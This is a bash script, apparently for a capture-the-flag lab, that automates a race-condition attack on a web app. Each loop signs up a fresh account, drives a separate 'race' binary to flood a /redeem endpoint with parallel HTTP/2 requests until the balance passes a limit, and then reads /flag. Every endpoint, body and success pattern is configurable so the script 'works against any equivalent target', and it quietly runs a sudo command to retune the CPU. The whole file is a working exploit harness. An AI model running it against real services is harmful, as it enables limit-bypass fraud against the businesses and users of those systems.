#!/usr/bin/env bash
# run.sh — automate signup → race → success-check against an HTTP/2 lab.
#
# Required:
#   ./run.sh <hostname>
#
# Override anything via env vars. Defaults match the pwnbox-style
# "Stampede"-class lab (signup form, /redeem race, /flag balance gate)
# but every endpoint, body, and regex is configurable so the same
# script works against any equivalent target.
#
#   # endpoints ------------------------------------------------------
#   SIGNUP_PATH      (default /signup)
#   SIGNUP_BODY      (default 'name=__USER__'   — __USER__ is replaced
#                    per attempt with a random hex name. Leave blank
#                    to send no body.)
#   SIGNUP_CT        (default application/x-www-form-urlencoded)
#   FLAG_PATH        (default /flag)
#   FLAG_METHOD      (default GET)
#   LOGOUT_PATH      (default /logout, leave blank to skip)
#   LOGOUT_METHOD    (default POST)
#   RACE_PATH        (default /redeem)
#   RACE_METHOD      (default POST)
#
#   # parsing --------------------------------------------------------
#   COOKIE_NAME      (default session)        cookie name to grab from Set-Cookie
#   BAL_REGEX        (default '"balance":[0-9]+')
#                                              regex; first all-digit run inside
#                                              the match is the balance
#   ERROR_MARKER     (default '"error"')      substring in /flag response
#                                              that means "not yet"
#
#   # race + tuning --------------------------------------------------
#   CONNS            (default 20)
#   STREAMS          (default 4)
#   PRELOAD_MS       (default 5)
#   USE_PING         (default false)          set 'true' to use -ping
#   WIN_MARKER       (default '"ok":true')    passed to race -win-marker
#   RACE_BAL_REGEX   (default '"balance":(\d+)')
#                                              passed to race -balance-regex
#                                              (must have one capture group)
#   TARGET_BAL       (default 400)
#   PORT             (default 443)
#   SCHEME           (default https)
#
#   # loop -----------------------------------------------------------
#   MAX_ATTEMPTS     (default 15)
#   RACE_BIN         (default ./race relative to this script)

set -u

HOST="${1:-}"
if [[ -z "$HOST" ]]; then
    echo "usage: $0 <hostname>" >&2
    exit 1
fi

SCHEME="${SCHEME:-https}"
PORT="${PORT:-443}"
BASE="$SCHEME://$HOST"

SIGNUP_PATH="${SIGNUP_PATH:-/signup}"
SIGNUP_BODY="${SIGNUP_BODY:-name=__USER__}"
SIGNUP_CT="${SIGNUP_CT:-application/x-www-form-urlencoded}"
FLAG_PATH="${FLAG_PATH:-/flag}"
FLAG_METHOD="${FLAG_METHOD:-GET}"
LOGOUT_PATH="${LOGOUT_PATH:-/logout}"
LOGOUT_METHOD="${LOGOUT_METHOD:-POST}"
RACE_PATH="${RACE_PATH:-/redeem}"
RACE_METHOD="${RACE_METHOD:-POST}"

COOKIE_NAME="${COOKIE_NAME:-session}"
BAL_REGEX="${BAL_REGEX:-\"balance\":[0-9]+}"
ERROR_MARKER="${ERROR_MARKER:-\"error\"}"

CONNS="${CONNS:-20}"
STREAMS="${STREAMS:-4}"
PRELOAD_MS="${PRELOAD_MS:-5}"
USE_PING="${USE_PING:-false}"
WIN_MARKER="${WIN_MARKER:-\"ok\":true}"
RACE_BAL_REGEX="${RACE_BAL_REGEX:-\"balance\":(\\d+)}"
TARGET_BAL="${TARGET_BAL:-400}"
MAX_ATTEMPTS="${MAX_ATTEMPTS:-15}"

SCRIPT_DIR="$(dirname "$(readlink -f "$0")")"
RACE_BIN="${RACE_BIN:-$SCRIPT_DIR/race}"
RACE_SRC="$SCRIPT_DIR/race.go"

rebuild_race() {
    if ! command -v go >/dev/null; then
        echo "[!] need 'go' on PATH to rebuild race binary" >&2
        return 1
    fi
    echo "[*] rebuilding race binary..." >&2
    (cd "$SCRIPT_DIR" && go build -o "$RACE_BIN" race.go) || return 1
}

if [[ ! -x "$RACE_BIN" ]]; then
    rebuild_race || { echo "[!] race binary missing and rebuild failed" >&2; exit 1; }
fi

# Detect a stale binary missing the new flags this script depends on.
if ! "$RACE_BIN" -h 2>&1 | grep -q -- '-path'; then
    echo "[!] race binary at $RACE_BIN is out of date (missing -path)." >&2
    rebuild_race || { echo "[!] rebuild failed — run 'go build -o race race.go' manually" >&2; exit 1; }
fi

# best-effort CPU performance tuning (silent if unavailable / no root)
echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor >/dev/null 2>&1 || true

RUN_RACE=(taskset -c 0 "$RACE_BIN")
command -v taskset >/dev/null || RUN_RACE=("$RACE_BIN")

extract_cookie() {
    grep -i '^set-cookie:' "$1" \
        | sed -n "s/.*${COOKIE_NAME}=\([^;]*\).*/\1/p" \
        | head -n1
}

random_name() {
    head -c 8 /dev/urandom | od -An -tx1 | tr -d ' \n'
}

for attempt in $(seq 1 "$MAX_ATTEMPTS"); do
    echo
    echo "================ attempt $attempt / $MAX_ATTEMPTS ================"

    # 1. sign up — fresh account every iteration
    USER="$(random_name)"
    BODY="${SIGNUP_BODY//__USER__/$USER}"
    hdrs="$(mktemp)"
    curl_args=(-sk -o /dev/null -D "$hdrs" -X POST "$BASE:$PORT$SIGNUP_PATH")
    if [[ -n "$BODY" ]]; then
        curl_args+=(-H "Content-Type: $SIGNUP_CT" --data "$BODY")
    fi
    curl "${curl_args[@]}"
    SESSION="$(extract_cookie "$hdrs")"
    rm -f "$hdrs"
    if [[ -z "$SESSION" ]]; then
        echo "[!] signup failed — no '$COOKIE_NAME' cookie in response"
        sleep 1
        continue
    fi
    echo "[*] user=$USER  ${COOKIE_NAME}=${SESSION:0:32}..."

    # 2. fire the race
    race_args=(-conns="$CONNS" -streams="$STREAMS"
               -preload-ms="$PRELOAD_MS"
               -path="$RACE_PATH" -method="$RACE_METHOD"
               -port="$PORT"
               -target=$((TARGET_BAL + 5))
               -host="$HOST"
               -cookie="${COOKIE_NAME}=${SESSION}"
               -win-marker="$WIN_MARKER"
               -balance-regex="$RACE_BAL_REGEX")
    if [[ "$USE_PING" == "true" ]]; then
        race_args+=(-ping)
    else
        race_args+=(-ping=false)
    fi
    "${RUN_RACE[@]}" "${race_args[@]}"

    # 3. check the success endpoint with our session
    if [[ "$FLAG_METHOD" == "GET" ]]; then
        FLAG_RESP="$(curl -sk "$BASE:$PORT$FLAG_PATH" \
            -H "Cookie: ${COOKIE_NAME}=${SESSION}")"
    else
        FLAG_RESP="$(curl -sk -X "$FLAG_METHOD" "$BASE:$PORT$FLAG_PATH" \
            -H "Cookie: ${COOKIE_NAME}=${SESSION}")"
    fi
    echo "[*] $FLAG_PATH → $FLAG_RESP"

    BAL="$(echo "$FLAG_RESP" | grep -oE "$BAL_REGEX" | grep -oE '[0-9]+' | head -n1)"
    BAL="${BAL:-0}"

    if [[ "$BAL" -ge "$TARGET_BAL" ]] && ! echo "$FLAG_RESP" | grep -qF "$ERROR_MARKER"; then
        echo
        echo "[+++] SUCCESS (balance=$BAL):"
        echo "$FLAG_RESP"
        exit 0
    fi

    echo "[-] balance=$BAL < $TARGET_BAL — retrying"
    if [[ -n "$LOGOUT_PATH" ]]; then
        curl -sk -o /dev/null -X "$LOGOUT_METHOD" \
            "$BASE:$PORT$LOGOUT_PATH" \
            -H "Cookie: ${COOKIE_NAME}=${SESSION}"
    fi
done

echo
echo "[!] gave up after $MAX_ATTEMPTS attempts"
exit 1
